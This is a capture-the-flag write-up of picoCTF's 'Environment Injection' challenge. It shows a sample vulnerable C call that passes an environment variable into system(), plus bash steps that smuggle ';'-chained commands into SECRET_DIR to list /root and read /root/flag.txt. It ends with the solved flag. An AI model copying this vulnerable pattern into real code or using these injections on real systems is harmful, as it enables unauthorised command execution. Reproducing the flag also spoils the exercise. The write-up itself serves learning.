# Environment Injection

**Platform:** picoCTF  
**Technique:** Command Injection via Environment Variable  
**Difficulty:** Easy  

## Challenge Description

A program that reads an environment variable `SECRET_DIR` and executes a command using `system()`. No input sanitization means we can inject arbitrary commands by manipulating the environment variable.

## Vulnerability

The program likely does something like:

```c
char *dir = getenv("SECRET_DIR");
char command[256];
sprintf(command, "ls %s", dir);
system(command);
```
By setting SECRET_DIR to a string containing ;, we can chain additional commands.

Exploitation
Step 1: Normal Behavior
```bash
export SECRET_DIR="."
./bin
```
Output: lists current directory (bin).

Step 2: Command Injection
Using ; to chain commands:

```bash
export SECRET_DIR="; ls -la /root"
./bin
```
Now the command becomes ls ; ls -la /root. The first ls runs, then ls -la /root runs, revealing /root/flag.txt.

Step 3: Find the Flag
```bash
export SECRET_DIR="; find / -name flag.txt 2>/dev/null"
./bin
```
Output shows /root/flag.txt.

Step 4: Read the Flag
```bash
export SECRET_DIR="; cat /root/flag.txt"
./bin
```
Output: picoCTF{Power_t0_man!pul4t3_3nv_1ac0e5a3}


text
bin
picoCTF{Power_t0_man!pul4t3_3nv_1ac0e5a3}
